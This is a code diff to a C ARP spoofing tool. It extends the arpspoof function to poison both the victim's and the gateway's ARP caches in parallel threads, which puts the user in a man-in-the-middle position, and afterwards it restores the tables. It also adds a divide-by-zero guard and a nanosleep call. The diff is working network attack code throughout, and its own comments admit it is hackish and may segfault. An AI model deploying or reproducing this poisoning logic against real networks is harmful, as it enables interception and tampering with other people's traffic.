@@ -54,7 +54,7 @@ static void *arpthread(void *argp)
 	const struct arguments *arguments = arg->arguments;
 	nmap_r *target = arg->target;
 	SOCKET iface = arg->iface;
-	struct timespec start = {0x0}, stop = { 0x0 };
+	struct timespec start = {0x0}, stop = { 0x0 }, time_to_sleep = { 0x0 };
 	uint64_t time_to_wait = 0;
 	unsigned char payload[42] = { 0x0 };
 	eth *eth_hdr = (eth*)payload;
@@ -63,9 +63,13 @@ static void *arpthread(void *argp)
 	// socklen_t ifaceinfolen;
 	size_t rlen;
 
-	time_to_wait = 60;
-	time_to_wait *= 1000000000;
-	time_to_wait /= arguments->ppm;
+	if (arguments->ppm != 0)
+	{
+		time_to_wait = 60;
+		time_to_wait *= 1000000000;
+		time_to_wait /= arguments->ppm;
+	}
+	time_to_sleep.tv_nsec = 10; // 10 nanoseconds
 
 	copy_mac(eth_hdr->dest_addr, target->ha);	/* 6 bytes dest addr */
 	copy_mac(eth_hdr->src_addr, arguments->self_ha);	/* 6 bytes src addr (us) */
@@ -104,7 +108,8 @@ static void *arpthread(void *argp)
 				{ ERROR_SEND(); goto err; }
 			clock_gettime(CLOCK_REALTIME, &start);
 		}
-		usleep(1);
+		if (time_to_wait != 0)
+			nanosleep(&time_to_sleep, NULL);
 	}
 	return NULL;
 err:
@@ -191,38 +196,60 @@ err:
 	return -1;
 }
 
-int arpspoof(const struct arguments *arguments, nmap_r *target)
+int arpspoof(const struct arguments *arguments, nmap_r **scan, long long victimidx)
 {
 	SOCKET arpsock = -1;
-	struct arguments argcopy;
-	pthread_t thread;
-	struct arpthreadinfo argp;
+	struct arguments argvictim, arggateway;
+	pthread_t threadvictim, threadgateway;
+	struct arpthreadinfo threadinfovictim, threadinfogateway;
 
 	if ((arpsock = initiate_socket_for_arp(arguments->ifacename)) == -1)
 		goto err;
 	TELLSOCKETSUCCESS(arguments->ifacename);
 
-	argp.iface = arpsock;
-	argp.arguments = arguments;
-	argp.target = target;
+	memcpy(&argvictim, arguments, sizeof(struct arguments));
+	memcpy(&arggateway, arguments, sizeof(struct arguments));
+
+	threadinfovictim.iface = arpsock;
+	threadinfogateway.iface = arpsock;
+
+	threadinfovictim.arguments = &argvictim;
+	threadinfogateway.arguments = &arggateway;
+
+	threadinfovictim.target = scan[victimidx];
+	threadinfogateway.target = get_gateway_from_scan(scan); // may segfault later on idk
+
+	// ultra hackish
+	copy_ipv4(arggateway.gateway_pa, scan[victimidx]->pa);
 
 	start_signal();
-	pthread_create(&thread, NULL, arpthread, &argp);
-	pthread_join(thread, NULL);
+	pthread_create(&threadvictim, NULL, arpthread, &threadinfovictim);
+	pthread_create(&threadgateway, NULL, arpthread, &threadinfogateway);
+
+	pthread_join(threadvictim, NULL);
+	pthread_join(threadgateway, NULL);
 	g_stop = 1;
 
 	TELLRESTORINGMAC();
-	memcpy(&argcopy, arguments, sizeof(struct arguments));
+
+	memcpy(&argvictim, arguments, sizeof(struct arguments));
+	memcpy(&arggateway, arguments, sizeof(struct arguments));
+
 	/*
 	** very sketchy, arpthread() is using self_ha as the mac to spoof,
 	** since we want to restore the arp table we need to put the REAL
 	** gateway HA as self HA
 	*/
-	copy_mac(argcopy.self_ha, arguments->gateway_ha);
-	argp.arguments = &argcopy;
+	copy_mac(argvictim.self_ha, arguments->gateway_ha);
 
-	pthread_create(&thread, NULL, arpthread, &argp);
-	pthread_join(thread, NULL);
+	copy_ipv4(arggateway.gateway_pa, scan[victimidx]->pa);
+	copy_mac(arggateway.self_ha, scan[victimidx]->ha);
+
+	pthread_create(&threadvictim, NULL, arpthread, &threadinfovictim);
+	pthread_create(&threadgateway, NULL, arpthread, &threadinfogateway);
+
+	pthread_join(threadvictim, NULL);
+	pthread_join(threadgateway, NULL);
 
 	stop_signal();
 	g_stop = 1;
